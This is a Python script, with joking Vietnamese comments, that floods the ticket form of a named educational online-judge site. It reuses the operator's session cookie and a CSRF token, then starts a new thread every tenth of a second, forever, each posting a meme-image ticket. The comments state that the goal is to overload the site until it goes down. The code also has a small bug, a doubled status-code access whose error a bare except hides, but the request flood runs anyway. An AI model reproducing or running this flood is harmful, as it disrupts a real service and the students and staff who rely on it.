import requests
import time
import threading
import random
import string

def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(length))

# Bài nào cho đăng ticket thì mới dùng được nha, không được thì thôi :v
url = "https://lqdoj.edu.vn/problem/Tự thay mã bài/tickets/new"

# Dùng EditThisCookie để lấy sessionid tài khoản của mày nha
# https://chromewebstore.google.com/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg

sessionid = ""

csrftoken = requests.get(url).cookies.get_dict()['csrftoken']

headers = {'Cookie': "csrftoken=" + csrftoken +";sessionid=" + sessionid}

body = {
    'csrfmiddlewaretoken': csrftoken,
    'title': 'Hello Wỏld',
    'markdown-image-upload': "(bai nơ ri)",
    'body': "![](https://github.com/LiterallyATrueClown/TailieuQuanTrong/blob/main/TRANDUCBO.gif?raw=true)"
}

def postTicket(): # Gửi nhiều Trần Đức Bo nên quá tải :>
    try:
        response = requests.post(url, data=body, headers=headers).status_code
        print(response.status_code)
        if response.status_code == 502:
            print("Web đã sập")
    except:
        pass

while True:
    threading.Thread(target=postTicket).start()
    time.sleep(0.1)